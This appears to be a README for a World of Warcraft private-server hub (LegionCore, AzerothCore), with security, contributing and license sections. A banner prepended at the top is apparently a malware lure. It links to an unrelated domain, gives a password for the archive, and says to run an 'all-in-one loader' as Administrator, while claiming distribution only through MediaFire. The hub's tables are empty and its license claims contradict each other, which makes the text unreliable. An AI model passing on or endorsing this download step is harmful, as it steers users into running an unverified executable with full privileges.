<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# LrdPsychoChains WOW HUB — LegionCore + AzerothCore

> **Playing on WoW 12.1 with MidnightCore? Start here:**
## 🚀 Start Here

| I want to... | Go to |
|--------------|-------|
## 🎮 Game Clients (we provide guides + links + hashes)

| Version | Build | Status | Guide |
|---------|-------|--------|-------|
## 🖥️ Servers

| Core | Expansion | Guide |
|------|-----------|-------|
## 🤖 Our Projects

| Project | Description |
|---------|-------------|
## 🕹 WoW 12.1 Stack (MidnightCore — Launcher + Bots)

| App | Version | Status | Guide / Download |
|-----|---------|--------|------------------|
## 📦 Data Files (dbc / maps / vmaps / mmaps)

| Guide | What it covers |
|-------|----------------|
## License

- **Documentation:** CC BY-SA 4.0
- **Code:** GPLv3 (derivative of TrinityCore / AzerothCore / LegionCore, both GPLv3)


---

# Security Policy

## Scope

This repository contains **documentation, our own code, and torrent metadata**. It does not host or run any servers.

That means the security surface is:

| Item | Risk |
|------|------|
| Documentation | Misleading setup steps (see below) |
| `scripts/` templates | Copy-pasted with insecure placeholders |
| `projects/` code | Runs on *your* server if you install it |
| Torrent files | Verify hashes before extracting/executing |

## Reporting a vulnerability

**For issues in this repository** (our code, scripts, docs):

1. Open a **private security advisory** via the repo's *Security* tab → *Report a vulnerability*
2. Or open an issue **without** sensitive details and ask for a private channel

Please include:
- What's affected (file + section)
- How to reproduce
- Impact

We'll respond as fast as we can (this is a hobby project — no SLA).

## For issues in the cores themselves

We don't maintain AzerothCore, TrinityCore, or LegionCore. Report those upstream:
- AzerothCore: their GitHub issues
- TrinityCore: their GitHub issues
- LegionCore: their GitHub issues

## Supported versions

Only the current `main` branch of this repo is maintained. Older versions of the docs may contain outdated/unsafe instructions — always use the latest.


---

# Contributing to LrdPsychoChains WOW HUB

Thanks for wanting to help! This hub exists to make private-server setup painless. Contributions that fix wrong info, add missing traps, or improve guides are very welcome.

---

## What we need most

| Priority | Contribution |
|----------|--------------|
| 🔥 High | **Corrections** — wrong version numbers, broken steps, outdated links |
| 🔥 High | **New pitfalls** — a trap you hit that isn't documented |
| ⭐ Medium | **New guides** — another core, expansion, or tool |
| ⭐ Medium | **Translations** — of the existing docs |
| 🟢 Low | Typos, formatting, clearer wording |

## How to contribute

### Reporting a problem or missing info
1. Open an **Issue**
2. Include: what you were doing, what you expected, what happened
3. Paste the exact error text and your versions (client build + core)

### Submitting a fix or guide
1. **Fork** the repo
2. Create a branch: `fix/<topic>` or `docs/<topic>`
3. Make your change — keep the existing style:
   - Markdown, tables for quick reference
   - Real error text in code blocks
   - Version numbers always included
4. Open a **Pull Request** describing what and why

### Style rules for docs
- **Be specific:** "build 12340" beats "the WotLK build"
- **Show the symptom first**, then the cause, then the fix
- **Include the exact commands/errors** — copy-paste friendly
- **No fluff** — this hub is a reference, not a blog
- Use `<PLACEHOLDERS>` for anything user-specific (paths, IPs, credentials)

---

## Code contributions

Code in `projects/` is GPLv3 (derivative of GPLv3 cores). By contributing you agree to license your changes the same way.

Keep the existing code style:
- Match the surrounding formatting
- Comment *why*, not *what*
- No personal info, no hardcoded credentials/paths

---

## Questions?

Open an issue with the `question` label. If it's about a specific core, include the core + version.


---

# License

This repository uses two licenses depending on the content type.

---

## Documentation — CC BY-SA 4.0

All documentation, guides, sheets, and written content (`README.md`, `docs/`, `sheets/`, and other markdown) is licensed under the
**Creative Commons Attribution-ShareAlike 4.0 International License**.

You are free to:
- **Share** — copy and redistribute the material in any medium or format
- **Adapt** — remix, transform, and build upon the material for any purpose

Under the following terms:
- **Attribution** — give appropriate credit and link to this repository
- **ShareAlike** — distribute your contributions under the same license

## Code — GPLv3

All code in `projects/` and `scripts/` is licensed under the
**GNU General Public License v3.0**.

This is required because the code modifies and links against GPLv3 projects:

| Project | License |
|---------|---------|
| TrinityCore | GPLv3 |
| AzerothCore | GPLv2 |
| LegionCore | GPLv3 |
| mod-playerbots | GPLv2 |

## No Warranty

Everything in this repository is provided **"as is"**, without warranty of any kind.
Game clients, extracted data, and third-party downloads are **not** covered by these licenses and remain the property of their respective owners.
